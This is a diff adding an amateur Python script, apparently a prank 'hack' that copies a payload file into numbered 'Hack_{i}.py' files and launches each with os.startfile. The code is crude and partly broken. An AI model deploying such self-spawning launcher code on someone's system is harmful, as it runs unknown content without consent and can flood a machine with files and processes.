@@ -1,1 +1,26 @@
+import os
+
+
+num = open('Content/Created.txt', 'r+')
+
+while True:
+    global i
+    for file in num:
+        txt = int(file)
+        i = txt
+        bak = txt+2
+
+    if i == bak:
+        break
+    i+=1
+    file = open(f"Hack_{i}.py", "w")
+    cont = open('Content/cont', 'r+')
+    for text in cont:
+        file.write(text)
+    os.startfile(f"hack_{i}.py")
+    print('Hacked!!!')
+
+    num = open('Content/Created.txt', 'w')
+    num.truncate(0)
+    num.write(str(bak))
 
